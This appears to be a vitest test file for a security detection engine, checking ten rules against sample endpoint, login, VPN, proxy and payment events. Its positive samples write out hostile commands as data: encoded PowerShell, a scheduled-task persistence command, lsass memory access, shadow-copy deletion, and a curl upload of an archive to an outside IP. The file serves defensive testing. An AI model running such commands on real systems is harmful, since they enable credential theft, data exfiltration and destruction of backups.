import { describe, it, expect } from 'vitest';
import { detect } from '../engine/detect';
import { RULES } from '../data/rules';
import { normalizeEvent } from '../engine/normalize';
import type { RiskEvent } from '../engine/types';

let n = 0;
const T0 = Date.parse('2026-11-25T10:00:00Z');
const ev = (o: Partial<RiskEvent> & { at?: number }): RiskEvent =>
  normalizeEvent({ client: 'meezan', source: 'endpoint', action: 'process_start', message: '', ...o, ts: new Date(T0 + (o.at ?? 0) * 1000).toISOString() } as Record<string, unknown>, ++n, 'demo');

const fires = (ruleId: string, events: RiskEvent[]) => detect(events, events, [], RULES.filter((r) => r.id === ruleId)).fired.length > 0;

const cases: Record<string, { pos: RiskEvent[]; neg: RiskEvent[] }> = {
  'rb-001': {
    pos: Array.from({ length: 5 }, (_, i) => ev({ source: 'web', action: 'login_failed', ip: '1.2.3.4', user: 'u' + i, at: i * 5 })),
    neg: Array.from({ length: 4 }, (_, i) => ev({ source: 'web', action: 'login_failed', ip: '1.2.3.4', at: i * 5 })),
  },
  'rb-002': {
    pos: [ev({ host: 'h1', process: 'powershell.exe', message: 'powershell.exe -NoProfile -enc SQBFAFgA' })],
    neg: [ev({ host: 'h1', process: 'powershell.exe', message: 'powershell.exe -File build.ps1' })],
  },
  'rb-003': {
    pos: [ev({ host: 'h1', process: 'schtasks.exe', message: 'schtasks /create /tn upd /tr C:\\Users\\bob\\AppData\\run.ps1' })],
    neg: [ev({ host: 'h1', process: 'schtasks.exe', message: 'schtasks /query' })],
  },
  'rb-004': {
    pos: [ev({ host: 'h1', process: 'rundll32.exe', message: 'process opened handle to lsass.exe memory' })],
    neg: [ev({ host: 'h1', process: 'notepad.exe', message: 'opened report.txt' })],
  },
  'rb-005': {
    pos: [ev({ source: 'syslog', action: 'user_created', user: 'backdoor.admin', meta: { privileged: true } })],
    neg: [ev({ source: 'syslog', action: 'user_created', user: 'new.intern', meta: { privileged: false } })],
  },
  'rb-006': {
    pos: [ev({ source: 'proxy', action: 'link_click', user: 'c.t', domain: 'meezan-fake-login.com', at: 0 }), ev({ source: 'web', action: 'login_success', user: 'c.t', ip: '203.0.113.88', at: 60 })],
    neg: [ev({ source: 'proxy', action: 'link_click', user: 'c.t', domain: 'meezan-fake-login.com', at: 0 }), ev({ source: 'web', action: 'login_success', user: 'c.t', ip: '10.0.0.5', at: 60 })],
  },
  'rb-007': {
    pos: [ev({ host: 'h1', process: 'vssadmin.exe', message: 'vssadmin delete shadows /all /quiet' })],
    neg: [ev({ host: 'h1', process: 'vssadmin.exe', message: 'vssadmin list shadows' })],
  },
  'rb-008': {
    pos: [ev({ source: 'vpn', action: 'login_success', user: 's.f', ip: '198.51.100.99', meta: { geo: 'Foreign (baseline: Karachi, PK)' } })],
    neg: [ev({ source: 'vpn', action: 'login_success', user: 's.f', ip: '10.1.2.3', meta: { geo: 'Karachi, PK' } })],
  },
  'rb-009': {
    pos: [ev({ host: 'h1', process: 'curl', action: 'net_upload', ip: '198.51.100.44', message: 'curl -T a.zip https://198.51.100.44/up' })],
    neg: [ev({ host: 'h1', process: 'curl', action: 'net_upload', ip: '10.0.0.9', message: 'backup to internal NAS' })],
  },
  'rb-010': {
    pos: [ev({ source: 'payments', action: 'transfer', user: 'ops', meta: { amount: 250000, hour: 3 } })],
    neg: [ev({ source: 'payments', action: 'transfer', user: 'ops', meta: { amount: 250000, hour: 14 } })],
  },
};

describe('detection rules', () => {
  it('has exactly 10 rules with YAML', () => {
    expect(RULES).toHaveLength(10);
    for (const r of RULES) expect(r.yaml).toContain(`id: ${r.id}`);
  });
  for (const [id, c] of Object.entries(cases)) {
    it(`${id} fires on positive and not on negative sample`, () => {
      expect(fires(id, c.pos)).toBe(true);
      expect(fires(id, c.neg)).toBe(false);
    });
  }
  it('rb-001 respects the 30s window', () => {
    const spread = Array.from({ length: 5 }, (_, i) => ev({ source: 'web', action: 'login_failed', ip: '1.2.3.4', at: i * 10 })); // 40s span
    expect(fires('rb-001', spread)).toBe(false);
  });
  it('rb-006 respects the 10 minute window', () => {
    const late = [ev({ source: 'proxy', action: 'link_click', user: 'x', domain: 'meezan-fake-login.com', at: 0 }), ev({ source: 'web', action: 'login_success', user: 'x', ip: '203.0.113.88', at: 700 })];
    expect(fires('rb-006', late)).toBe(false);
  });
  it('dedupes the same rule+entity within 60s', () => {
    const evs = Array.from({ length: 8 }, (_, i) => ev({ source: 'web', action: 'login_failed', ip: '1.2.3.4', at: i * 2 }));
    const r = detect(evs, evs, [], RULES.filter((x) => x.id === 'rb-001'));
    expect(r.fired).toHaveLength(1);
  });
});
